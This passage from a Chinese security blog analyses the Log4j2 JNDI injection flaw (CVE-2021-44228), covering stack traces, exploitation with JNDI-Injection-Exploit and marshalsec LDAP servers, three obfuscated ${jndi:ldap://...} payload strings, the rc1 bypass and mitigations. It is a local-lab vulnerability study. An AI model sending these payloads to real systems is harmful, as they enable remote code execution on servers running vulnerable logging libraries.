</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>pattern</span><span class=p>.</span><span class=na>PatternFormatter</span><span class=p>.</span><span class=na>format</span><span class=p>(</span><span class=n>PatternFormatter</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>38</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>layout</span><span class=p>.</span><span class=na>PatternLayout$PatternSerializer</span><span class=p>.</span><span class=na>toSerializable</span><span class=p>(</span><span class=n>PatternLayout</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>333</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>layout</span><span class=p>.</span><span class=na>PatternLayout</span><span class=p>.</span><span class=na>toText</span><span class=p>(</span><span class=n>PatternLayout</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>232</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>layout</span><span class=p>.</span><span class=na>PatternLayout</span><span class=p>.</span><span class=na>encode</span><span class=p>(</span><span class=n>PatternLayout</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>217</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>layout</span><span class=p>.</span><span class=na>PatternLayout</span><span class=p>.</span><span class=na>encode</span><span class=p>(</span><span class=n>PatternLayout</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>57</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>appender</span><span class=p>.</span><span class=na>AbstractOutputStreamAppender</span><span class=p>.</span><span class=na>directEncodeEvent</span><span class=p>(</span><span class=n>AbstractOutputStreamAppender</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>177</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>appender</span><span class=p>.</span><span class=na>AbstractOutputStreamAppender</span><span class=p>.</span><span class=na>tryAppend</span><span class=p>(</span><span class=n>AbstractOutputStreamAppender</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>170</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>appender</span><span class=p>.</span><span class=na>AbstractOutputStreamAppender</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>AbstractOutputStreamAppender</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>161</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>AppenderControl</span><span class=p>.</span><span class=na>tryCallAppender</span><span class=p>(</span><span class=n>AppenderControl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>156</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>AppenderControl</span><span class=p>.</span><span class=na>callAppender0</span><span class=p>(</span><span class=n>AppenderControl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>129</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>AppenderControl</span><span class=p>.</span><span class=na>callAppenderPreventRecursion</span><span class=p>(</span><span class=n>AppenderControl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>120</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>AppenderControl</span><span class=p>.</span><span class=na>callAppender</span><span class=p>(</span><span class=n>AppenderControl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>84</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>LoggerConfig</span><span class=p>.</span><span class=na>callAppenders</span><span class=p>(</span><span class=n>LoggerConfig</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>448</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>LoggerConfig</span><span class=p>.</span><span class=na>processLogEvent</span><span class=p>(</span><span class=n>LoggerConfig</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>433</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>LoggerConfig</span><span class=p>.</span><span class=na>log</span><span class=p>(</span><span class=n>LoggerConfig</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>417</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>LoggerConfig</span><span class=p>.</span><span class=na>log</span><span class=p>(</span><span class=n>LoggerConfig</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>403</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>AwaitCompletionReliabilityStrategy</span><span class=p>.</span><span class=na>log</span><span class=p>(</span><span class=n>AwaitCompletionReliabilityStrategy</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>63</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>core</span><span class=p>.</span><span class=na>Logger</span><span class=p>.</span><span class=na>logMessage</span><span class=p>(</span><span class=n>Logger</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>146</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>AbstractLogger</span><span class=p>.</span><span class=na>logMessageSafely</span><span class=p>(</span><span class=n>AbstractLogger</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>2091</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>AbstractLogger</span><span class=p>.</span><span class=na>logMessage</span><span class=p>(</span><span class=n>AbstractLogger</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1988</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>AbstractLogger</span><span class=p>.</span><span class=na>logIfEnabled</span><span class=p>(</span><span class=n>AbstractLogger</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1960</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>logging</span><span class=p>.</span><span class=na>log4j</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>AbstractLogger</span><span class=p>.</span><span class=na>error</span><span class=p>(</span><span class=n>AbstractLogger</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>723</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>Log4jTEst</span><span class=p>.</span><span class=na>main</span><span class=p>(</span><span class=n>Log4jTEst</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>7</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>其实整体看的话就很巧合，刚好解析 jndi 关键字，而且还是无 waf 的，果然是核弹级漏洞！🥵</p><p>RCE的话有两种方法，一种是直接利用 JNDI-Injection-Exploit 开启恶意服务</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class=s2>&#34;open -a Calculator&#34;</span> -A <span class=s2>&#34;127.0.0.1&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>还有就是自己编译开启服务</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># https://github.com/RandomRobbieBF/marshalsec-jar</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>javac Evil.java
</span></span><span class=line><span class=cl>python3 -m http.server <span class=m>8000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class=s2>&#34;http://127.0.0.1:8000/#Eval&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/log4j2-deserialization-vuln/9.png width=2372 height=1492 srcset="/p/log4j2-deserialization-vuln/9_hu_8b836a9161f58f65.png 480w, /p/log4j2-deserialization-vuln/9_hu_3a153b53e6d439c4.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=158 data-flex-basis=381px></p><p>对于这个版本发布了两个🍮，一个是 rc1 一个是 rc2，rc2是安全的，rc1存在绕过，简单说说，详细看引用的最后两篇文章，默认的配置的话，加载的类实例为<code>SimpleMessagePatternConverter</code>这个类只是简单的拼接Message信息，并不会去尝试解析<code>${</code>，所以根本不会有<code>lookup</code>操作。但是如果配置文件中指配置文件白名单设置允许 jndi 到指定地址的情况，就可以绕过</p><p><img src=/p/log4j2-deserialization-vuln/10.png width=2330 height=740 srcset="/p/log4j2-deserialization-vuln/10_hu_e2e84332f1e1afd4.png 480w, /p/log4j2-deserialization-vuln/10_hu_924d289f87bd8334.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=314 data-flex-basis=755px></p><p>借用大佬的一步分析图</p><p><img src=/p/log4j2-deserialization-vuln/11.png width=1080 height=465 srcset="/p/log4j2-deserialization-vuln/11_hu_82e7fbeec646f278.png 480w, /p/log4j2-deserialization-vuln/11_hu_87c30ba35ac1a8a.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=232 data-flex-basis=557px></p><p>写几个可用poc</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=err>$</span><span class=p>{</span><span class=err>${,:-j</span><span class=p>}</span><span class=err>ndi:ldap:</span><span class=c1>//127.0.0.1:1389/#Eval}
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>$</span><span class=p>{</span><span class=err>jndi:ldap:</span><span class=c1>//127.0.0.1:1389/#Eval }
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>${${::-j</span><span class=p>}</span><span class=err>ndi:ldap:</span><span class=c1>//127.0.0.1:1389/#Eval}
</span></span></span></code></pre></td></tr></table></div></div><h2 id=修复>修复</h2><p>CVE-2017-5645 直接防止外部访问4712端口即可</p><p>CVE-2021-44228 修复</p><ol><li>设置log4j2.formatMsgNoLookups=True。相当于直接禁止lookup查询出栈，也就不可能请求到访问到远程的恶意站点。</li><li>对包含有"jndi:ldap://"、&ldquo;jndi:rmi//"、&ldquo;dns://&ldquo;这样字符串的请求进行拦截，即拦截JNDI语句来防止JNDI注入。</li></ol><p>同时由于我重装服务器这里也放一下如何安装JDK8u202的命令，debian12服务器安装jdk</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget https://repo.huaweicloud.com:8443/artifactory/java-local/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>cp jdk-8u202-linux-x64.tar.gz /usr/local
</span></span><span class=line><span class=cl><span class=nb>cd</span> /usr/local <span class=o>&amp;&amp;</span> tar zxvf jdk-8u202-linux-x64.tar.gz
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>vim /etc/profile
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>JAVA_HOME</span><span class=o>=</span>/usr/local/jdk1.8.0_202
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>JRE_HOME</span><span class=o>=</span>/usr/local/jdk1.8.0_202/jre
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>CLASS_PATH</span><span class=o>=</span>.:<span class=nv>$JAVA_HOME</span>/lib/dt.jar:<span class=nv>$JAVA_HOME</span>/lib/tools.jar:<span class=nv>$JRE_HOME</span>/lib
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span><span class=nv>$PATH</span>:<span class=nv>$JAVA_HOME</span>/bin:<span class=nv>$JRE_HOME</span>/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>source</span> /etc/profile
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 注册Java8</span>
</span></span><span class=line><span class=cl>sudo update-alternatives --install /usr/bin/java java /usr/local/jdk1.8.0_202/bin/java <span class=m>1</span>
</span></span><span class=line><span class=cl>sudo update-alternatives --install /usr/bin/javac javac /usr/local/jdk1.8.0_202/bin/javac <span class=m>1</span>
</span></span><span class=line><span class=cl>sudo update-alternatives --install /usr/bin/jar jar /usr/local/jdk1.8.0_202/bin/jar <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=c1># 选java版本</span>
</span></span><span class=line><span class=cl>update-alternatives --config java 
</span></span></code></pre></td></tr></table></div></div><blockquote><p><a class=link href=https://xz.aliyun.com/news/6606 target=_blank rel=noopener>https://xz.aliyun.com/news/6606</a></p><p><a class=link href=https://jarenl.com/index.php/2025/03/10/cve_2021_44228/ target=_blank rel=noopener>https://jarenl.com/index.php/2025/03/10/cve_2021_44228/</a></p><p><a class=link href=https://jaspersec.top/posts/1237655284.html target=_blank rel=noopener>https://jaspersec.top/posts/1237655284.html</a></p><p><a class=link href=https://www.cnblogs.com/dhan/p/18419927 target=_blank rel=noopener>https://www.cnblogs.com/dhan/p/18419927</a></p><p><a class=link href=https://xz.aliyun.com/news/11723 target=_blank rel=noopener>https://xz.aliyun.com/news/11723</a></p><p><a class=link href=https://www.cnblogs.com/LittleHann/p/17768907.html target=_blank rel=noopener>https://www.cnblogs.com/LittleHann/p/17768907.html</a></p><p><a class=link href=https://mp.weixin.qq.com/s/_qA3ZjbQrZl2vowikdPOIg target=_blank rel=noopener>https://mp.weixin.qq.com/s/_qA3ZjbQrZl2vowikdPOIg</a></p><p><a class=link href=https://mp.weixin.qq.com/s/XheO7skhvmO-_ygJAx6-cQ target=_blank rel=noopener>https://mp.weixin.qq.com/s/XheO7skhvmO-_ygJAx6-cQ</a></p></blockquote></section><footer class=article-footer><section class=article-tags></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/java-rome-deserialization/><div class=article-details><h2 class=article-title>Rome反序列化漏洞</h2></div></a></article><article><a href=/p/jdk8u20-deserialization/><div class=article-details><h2 class=article-title>Jdk8u20反序列化漏洞</h2></div></a></article><article><a href=/p/java-deserialization-protocol-intro/><div class=article-details><h2 class=article-title>Java反序列化协议入门</h2></div></a></article><article><a href=/p/jdk7u21-deserialization/><div class=article-details><h2 class=article-title>Jdk7u21反序列化漏洞</h2></div></a></article><article><a href=/p/shiro550-deserialization/><div class=article-details><h2 class=article-title>Shiro550反序列化</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2024 -
2025 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>